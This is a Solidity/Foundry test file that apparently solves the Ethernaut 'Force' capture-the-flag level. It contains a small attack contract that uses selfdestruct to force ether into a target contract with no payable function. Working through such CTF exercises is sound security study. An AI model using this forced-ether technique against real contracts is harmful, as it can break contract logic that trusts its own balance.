// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract ForceAttack {
  function byebye(address payable _dest) public {
    selfdestruct(_dest);
  }

  receive() external payable {}

}

contract ForceTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea);
  }

  function testExploit() public {
    ForceAttack attackerContract = new ForceAttack();

    (bool success,) = address(attackerContract).call{value: 1 wei}("");
    success;

    attackerContract.byebye(payable(challengeAddress));

    utils.submitLevelInstance(challengeAddress);
  }
}
